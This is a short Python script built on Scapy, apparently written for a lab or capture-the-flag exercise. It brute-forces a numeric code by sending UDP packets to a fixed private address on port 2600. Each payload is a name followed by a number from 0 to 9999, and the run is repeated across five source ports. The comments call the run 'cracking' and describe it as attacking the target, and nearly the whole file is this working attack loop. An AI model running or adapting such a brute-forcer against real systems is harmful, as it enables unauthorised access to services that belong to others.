from scapy.all import *
from scapy.layers.inet import *


def main():
    # Setup packet parameters
    target = "10.12.1.144"
    agent_name = "Ethan Hunt "
    ports = [3, 33, 333, 3333, 33333]

    print "Establishing connection ...\n"

    skt = conf.L3socket(iface="eth0")

    print "Connection established!\n"
    print "Beginning cracking...\n"

    for p in ports:
        for i in range(10000):
            pkt = packet_craft(agent_name, i, p, target)
            # Verbosity level is numberic.  0 is for a silent sned
            _, recv = skt.sr(pkt, verbose=0, timeout=0)
            print "Sent packet {:d} on port {:d}\n".format(i, p)

    print "Done cracking!\n"


def packet_craft(agent_name, code_attempt, source_port, target):
    """Takes source port and returns a Scapy packet using that source port attacking a constant target"""
    payload = agent_name + str(code_attempt)
    pkt = IP(dst=target) / UDP(sport=source_port, dport=2600) / payload
    return pkt


if __name__ == '__main__':
    main()
